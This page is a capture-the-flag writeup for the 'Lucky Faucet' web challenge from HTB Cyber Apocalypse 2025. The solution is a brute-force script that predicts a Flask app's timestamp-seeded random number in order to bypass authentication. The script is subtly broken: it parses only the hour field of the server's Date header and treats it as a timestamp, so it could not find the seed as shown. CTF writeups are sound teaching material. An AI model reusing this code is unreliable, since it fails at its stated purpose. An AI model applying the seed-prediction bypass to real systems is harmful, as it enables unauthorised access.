---
layout: page
title: "Lucky Faucet - HTB Cyber Apocalypse 2025 Writeup"
subtitle: "Flask app with a predictable random seed based on server timestamp. Predict the "lucky number" to bypass authentication and claim the flag."
permalink: /ctf/writeups/challenges/web/lucky-faucet/
category: "web"
challenge_name: "Lucky Faucet"
difficulty: "Easy"
event: "HTB Cyber Apocalypse 2025"
points: "325"
solves: "312"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: HTB Cyber Apocalypse 2025
* **Difficulty**: Easy
* **Points**: 325
* **Solves**: 312
* **Category**: Web
* **Tags**: Weak Randomness, Python Flask, Timestamp Seed

---

## 📝 Description
Flask app with a predictable random seed based on server timestamp. Predict the "lucky number" to bypass authentication and claim the flag.

---

## 💡 Solution / Approach
```python
import random, time, requests

# Sync time with server
r = requests.get("http://target/")
server_time = int(r.headers.get('Date', '').split(' ')[4].split(':')[0])

# Brute nearby timestamps
for ts in range(server_time - 10, server_time + 10):
    random.seed(ts)
    guess = random.randint(1, 1000000)
    r = requests.post("http://target/guess", json={"number": guess})
    if "HTB{" in r.text:
        print(r.text)
        break
```
